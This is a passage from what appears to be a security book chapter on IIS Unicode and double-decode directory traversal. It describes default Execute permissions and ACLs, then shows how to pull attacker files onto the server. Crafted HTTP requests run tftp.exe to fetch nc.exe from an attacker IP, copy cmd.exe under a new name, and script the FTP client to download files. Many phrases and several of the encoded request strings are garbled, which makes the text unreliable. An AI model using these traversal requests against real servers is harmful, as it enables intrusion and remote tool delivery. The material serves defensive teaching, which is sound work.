Why at this point is it that the Unicode and double decode attacks are so similar, the illegal Unicode and double-hex encoded attacks can be used interchangeably in exploits if the server hasn't been patched for vulnerability. Double decode is a post-Service Pack 2 Hotfixes, so it is more likely to be found at sites that only patch up to the latest Service Pack and forget to apply post-Service Pack Hotfixes (no one we know, right)?

Clearly, traversal decoding is undesirable, but the severity of the Unicode and double decodes are limited by a handful of mitigating factors:

- The first virtual directory in the request (in our example, /scripts) must have Execute permissions for the requesting user. This usually isn't much of a deterrent, IIS is commonly configured with several directories that grant Execute to IUSR by default: scripts, iassamples, iisadmin, iishelp, msad4, vti_bin, certsrv, certcontrol, and cernernoll.
- If the initial virtual directory isn't located on the system volume, it's impossible to jump to another volume. No syntax exists to perform such a jump. Because cmd.exe is located on the system volume, it can't be executed by the Unicode or double decode exploits. Of course, this doesn't mean other powerful executables do not exist on the volume where the Web site is rooted, and directory traversal makes looking trivial.

Commands fired off via Unicode are executed in the context of the remote user making the HTTP request. Typically, this is the IUSR_machinename account used to impersonate anonymous Web requests, which is a member of the Guests built-in group and has highly restricted privileges on default Windows NT/2000 systems.

Although the scope of the compromise is initially limited by these, if further exposures can be identified on a vulnerable server, the situation can quickly become much worse. As we will see shortly, a combination of issues can turn directory traversal into a security problem.

If nonprivileged or anonymous users possesses the capability to write to disk a Web server, security breach is usually not far off the offing. Unfortunately, the out-of-the-default ACLs allow Everyone:Full Control on C:\inetpub\scripts, and several other directories, making this a real possibility. Vulnerabilities like this are running the Unicode and double decode directory traversal when writing to disk nearly trivial, as we describe.

## Downloading Files Using SMB, FTP, or TFTP

Assuming an appropriate target directory can be identified, techniques for writing to it depending on what the firewall allows to/from the target Web server.

If the firewall allows outbound SMB (TCP 139) and/or 445, files can be sucked from a remote attacker's system using Windows-in file sharing.

If FTP (TCP 21) and/or TFTP (UDP 69) are available, a common play is to use the FTP or TFTP client on the target machine to upload files from a remote attacker's system (which is running on an FTP or TFTP server). Some examples of commands to perform this trick are:

Uploading nearly using TFTP is simple. First, set up a TFTP server on the attacker's system (192.168.234.31, in this example). Then, run the following on the victim using a directory traversal exploit like Unicode:

```
GET /scripts/..%250c/%winnt/system32/tftp.exe
-u="192.168.234.31&C=\nc.exe HTTP/1.0
```

Note that this example refers to C:, as it is writable by default. Also, not if C:\nc.exe allows except, you get an error stating "ftp:can't write to local file 'C:\nc.exe.' A successful transfer should return an HTTP 502 Gateway Error with a header message like this: "Transfer success: 59392 bytes in 1 second, 59392 bytes/s."

Using FTP is more difficult, but it's more likely to be allowed outbound from the target. The goal is first to create an arbitrary file (let's call it ftptmp) on the target machine, which is then used to script the FTP client using the -s:filename. Before you can create this file, however, you need to overcome one obstacle.

### NOTE
Redirection of using > isn't possible using cmd.exe via the Unicode exploit.

Unfortunately for the world's Web server administrators, some clever discovered that renaming cmd.exe bypasses this restriction. So, to create our FTP client script, you must create a renamed cmd.exe:

```
GET /scripts/../%c0@af/../windows/system32/cmd.exe?+c/copy
+c:\system32\cmd.exe:+cmd1.exe HTTP/1.0
```

Note, we've again written the file to C: because Everyone can create our FTP script file using the echo command. The following example designates certain attributes required by the FTP client (script filename= ftprint, server IP address= 192.168.234.31). You can even launch the FTP client script and retrieve net in the same stroke or (this example is broken into multiple lines because of page restrictions):

```
GET /scripts/../%c0@af/../cmd.exe?+c/echo+anonymous>C:\ftprint
&echo&@a@com.com>>:ftprint
&echo&+get+test.txt<C:\ftprint>>:ftprint&echo&+bye>>:ftprint
&ftp+-s:C:\ftprint_192.168.234.31&&del&C:\ftprint
```
